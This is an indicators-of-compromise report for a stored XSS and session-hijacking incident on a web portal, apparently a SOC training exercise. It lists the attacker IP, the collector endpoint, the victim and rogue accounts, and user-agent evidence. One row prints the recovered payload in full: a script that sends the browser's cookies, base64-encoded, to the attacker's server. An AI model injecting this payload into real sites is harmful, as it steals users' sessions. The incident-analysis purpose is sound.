# Indicators of Compromise: INC-2026-006

**Incident:** INC-2026-006, stored XSS and session hijacking on NexaPortal
**Date:** 18 June 2026
**Analyst:** Johan-Emmanuel Hatchi, SOC Analyst L1, BeCode Corp

This file lists every indicator recovered during the investigation, with its evidence source. All values are extracted from the evidence bundle, not from the bundle README.

## Network indicators

| Type | Value | Source |
|------|-------|--------|
| Attacker IP | 91.92.100.45 | tshark conversation analysis, attack.pcap |
| Collector port | 8080 | tcp.dstport on beacon flow, attack.pcap |
| Collector endpoint | /collect | http.request.full_uri, attack.pcap |
| Beacon URL pattern | http://91.92.100.45:8080/collect?c=<base64> | beacon request, attack.pcap |
| Victim workstation | 192.168.10.110 | conversation analysis, attack.pcap |

## Host and application indicators

| Type | Value | Source |
|------|-------|--------|
| Injection vector | POST /portal/feedback.php | web_access.log, attack.pcap |
| XSS payload | `<script>fetch('http://91.92.100.45:8080/collect?c='+btoa(document.cookie))</script>` | POST body, hex plus URL decoded, attack.pcap |
| Encoding function | btoa (Base64) | recovered from payload |
| Victim account | p.dumont | login.php POST body, attack.pcap |
| Stolen session cookie | PHPSESSID=[REDACTED] | Base64 decode of beacon parameter, attack.pcap |
| Unauthorized account | m.renard (origin undetermined) | login.php POST body from attacker IP, attack.pcap |

## Behavioral indicators

| Type | Value | Source |
|------|-------|--------|
| Attacker user agent | Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0 | web_access.log |
| Fleet baseline (contrast) | Chrome / Edge on Windows | web_access.log |

The user agent is a soft indicator: it distinguishes attacker traffic from the legitimate Windows fleet, but a user agent can be spoofed. It supports attribution, it does not prove it on its own.

## Note on m.renard

The account `m.renard` authenticated from the attacker IP and appears in no NexaCorp employee directory. Its password follows the same pattern as legitimate accounts, which leaves its origin undetermined (attacker-created foothold, or compromised pre-existing account). It is listed as an IOC because, in both cases, it must be treated as unauthorized and removed.
